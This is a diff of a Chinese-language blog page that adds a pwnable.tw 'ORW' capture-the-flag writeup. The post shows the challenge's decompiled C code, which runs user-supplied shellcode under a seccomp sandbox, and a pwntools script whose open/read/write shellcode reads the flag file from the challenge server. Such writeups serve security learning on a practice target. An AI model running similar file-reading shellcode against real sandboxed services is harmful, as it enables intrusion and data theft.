@@ -146,6 +146,78 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/pwnable-tw-ORW-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wh0am1">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0am1's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/archives/pwnable-tw-ORW-Writeup/" class="post-title-link" itemprop="url">pwnable.tw ORW Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2020-10-16 19:25:00 / 修改時間：19:36:37" itemprop="dateCreated datePublished" datetime="2020-10-16T19:25:00+08:00">2020-10-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="pwnable-tw-ORW-pwn"><a href="#pwnable-tw-ORW-pwn" class="headerlink" title="pwnable.tw ORW (pwn)"></a>pwnable.tw ORW (pwn)</h1><h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Canary, Partial RELRO</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先是讀取了一大段shellcode, 接著直接跑起來</p>
+<p>不過還是先看看 <code>orw_seccomp()</code>:</p>
+<h3 id="orw-seccomp"><a href="#orw-seccomp" class="headerlink" title="orw_seccomp"></a>orw_seccomp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在C語言有一種”SandBox模式”, 限制程式只能使用 <code>open()</code>, <code>read()</code>, <code>write()</code></p>
+<p>可以通過<code>seccomp()</code> 或是<code>prctl()</code>開啟</p>
+<p>所以這裡的邏輯不重要, 只要知道只能 open, read, write就好</p>
+<p>也不用繞canary, 因為沒有Control PC</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>利用pwntools <code>shellcraft()</code>拼出call open, read, write印出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.i386.pushstr(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_open&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_read&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_write&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give my your shellcode:&#x27;</span>, asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
     <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/pwnable-tw-start-Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -367,7 +439,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
